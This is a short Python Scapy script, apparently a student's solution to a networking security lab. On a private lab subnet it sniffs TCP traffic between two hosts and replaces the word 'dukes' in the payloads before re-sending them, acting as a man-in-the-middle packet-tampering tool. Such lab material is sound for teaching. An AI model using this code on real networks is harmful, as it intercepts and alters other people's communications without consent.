from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B or pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.

        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        #################################################################
        # Construct the new payload based on the old payload.
        # Students need to implement this part.

        if pkt[TCP].payload:
            originalTxt = pkt[TCP].payload.load.decode("utf-8")
            name = "dukes"
            newTxt = originalTxt.replace(name, "XXXXX")
            send(newpkt/newTxt)
        else:
            send(newpkt)
        

f = 'tcp and not ether src 02:42:0a:09:00:69' # Excluding our own generated packets.
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)

'''
As in the previous example, first set up the netcat connection and then spoof and run this program.
'''